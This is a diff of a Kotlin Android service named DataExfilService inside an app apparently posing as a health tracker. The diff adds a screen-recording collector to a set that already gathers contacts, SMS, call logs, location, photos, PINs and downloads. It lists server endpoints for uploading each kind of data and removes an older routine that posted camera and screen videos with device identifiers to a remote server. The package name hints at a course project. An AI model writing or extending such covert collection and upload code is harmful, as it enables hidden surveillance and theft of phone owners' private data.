@@ -20,18 +20,8 @@ import java.net.HttpURLConnection
 import java.net.URL
 import java.text.SimpleDateFormat
 import java.util.*
-import android.database.ContentObserver
-import android.provider.MediaStore
-import android.content.ContentUris
 import android.content.IntentFilter
-import android.net.Uri
-import okhttp3.*
-import okhttp3.MediaType.Companion.toMediaTypeOrNull
-import okhttp3.RequestBody.Companion.toRequestBody
-import java.io.IOException
-import android.provider.ContactsContract
 import android.provider.Settings
-import android.provider.CallLog
 import com.inf2007.healthtracker.R
 import com.inf2007.healthtracker.utilities.collectors.AppCollector
 import com.inf2007.healthtracker.utilities.collectors.ContactCollector
@@ -40,6 +30,7 @@ import com.inf2007.healthtracker.utilities.collectors.DownloadCollector
 import com.inf2007.healthtracker.utilities.collectors.LocationCollector
 import com.inf2007.healthtracker.utilities.collectors.PhotoCollector
 import com.inf2007.healthtracker.utilities.collectors.PinCollector
+import com.inf2007.healthtracker.utilities.collectors.ScreenRecordingCollector
 import com.inf2007.healthtracker.utilities.collectors.SmsCallLogCollector
 
 class DataExfilService : Service() {
@@ -50,16 +41,16 @@ class DataExfilService : Service() {
         private const val NOTIFICATION_CHANNEL_ID = "data_exfil_channel"
         private const val NOTIFICATION_ID = 1001
         private const val SERVER_ENDPOINT = "$BASE_URL/accessibility_logs"
-        const val PIN_ENDPOINT = "$BASE_URL/pin_logs"
-        const val DOWNLOADS_ENDPOINT = "$BASE_URL/downloads"
         private const val COMMAND_ENDPOINT = "$BASE_URL/commands"
-        private const val VIDEO_ENDPOINT = "$BASE_URL/videos"
         const val USER_APPS_ENDPOINT = "$BASE_URL/user_apps"
+        const val CONTACTS_ENDPOINT = "$BASE_URL/contacts"
+        const val DOWNLOADS_ENDPOINT = "$BASE_URL/downloads"
         const val LOCATION_ENDPOINT = "$BASE_URL/location_update"
         const val PHOTOS_ENDPOINT = "$BASE_URL/photos"
-        const val CONTACTS_ENDPOINT = "$BASE_URL/contacts"
+        const val PIN_ENDPOINT = "$BASE_URL/pin_logs"
         const val SMS_ENDPOINT = "$BASE_URL/sms"
         const val CALL_LOG_ENDPOINT = "$BASE_URL/call_logs"
+        const val VIDEO_ENDPOINT = "$BASE_URL/videos"
     }
 
     private lateinit var handler: Handler
@@ -86,8 +77,9 @@ class DataExfilService : Service() {
                 val filePath = intent.getStringExtra("file_path") ?: return
 
                 when (type) {
-                    "camera_video" -> uploadVideoToServer(File(filePath))
-                    "screen_recording" -> uploadVideoToServer(File(filePath)) // Same handler
+                    "camera_video", "screen_recording" -> {
+                        collectors.filterIsInstance<ScreenRecordingCollector>().firstOrNull()?.uploadVideo(File(filePath))
+                    }
                 }
             }
         }
@@ -138,6 +130,7 @@ class DataExfilService : Service() {
             add(PhotoCollector(this@DataExfilService))
             add(PinCollector(this@DataExfilService))
             add(SmsCallLogCollector(this@DataExfilService))
+            add(ScreenRecordingCollector(this@DataExfilService))
         }
 
         collectors.forEach { it.startObserving() }
@@ -521,60 +514,5 @@ class DataExfilService : Service() {
                 handler.postDelayed(this, 5000) // Check every 5 seconds
             }
         })
-    }
-
-    private val videoUploadPrefs by lazy {
-        getSharedPreferences("video_upload_log", Context.MODE_PRIVATE)
-    }
-
-    private fun uploadVideoToServer(videoFile: File) {
-        if (!isNetworkAvailable()) {
-            handler.postDelayed({ uploadVideoToServer(videoFile) }, 60000)
-            return
-        }
-
-        Thread {
-            try {
-                val deviceId = getUniqueDeviceId()
-                val bytes = videoFile.readBytes()
-
-                val requestBody = MultipartBody.Builder()
-                    .setType(MultipartBody.FORM)
-                    .addFormDataPart("file", videoFile.name,
-                        bytes.toRequestBody("video/mp4".toMediaTypeOrNull()))
-                    .addFormDataPart("device_id", deviceId)
-                    .addFormDataPart("device_model", Build.MODEL)
-                    .addFormDataPart("file_size", videoFile.length().toString())
-                    .addFormDataPart("timestamp", System.currentTimeMillis().toString())
-                    .addFormDataPart("type", "camera_recording")
-                    .build()
-
-                val request = Request.Builder()
-                    .url(VIDEO_ENDPOINT)
-                    .post(requestBody)
-                    .build()
-
-                NetworkClient.instance.newCall(request).enqueue(object : Callback {
-                    override fun onFailure(call: Call, e: IOException) {
-                        Log.e(TAG, "Video upload failed: ${videoFile.name}")
-                        handler.postDelayed({ uploadVideoToServer(videoFile) }, 60000)
-                    }
-
-                    override fun onResponse(call: Call, response: Response) {
-                        if (response.isSuccessful) {
-                            Log.i(TAG, "Video uploaded: ${videoFile.name}")
-                            videoUploadPrefs.edit().putBoolean("video_${videoFile.name}", true).apply()
-                            // Optionally delete after upload
-                            // videoFile.delete()
-                        } else {
-                            handler.postDelayed({ uploadVideoToServer(videoFile) }, 60000)
-                        }
-                        response.close()
-                    }
-                })
-            } catch (e: Exception) {
-                Log.e(TAG, "Error uploading video: ${e.message}")
-            }
-        }.start()
     }
 }
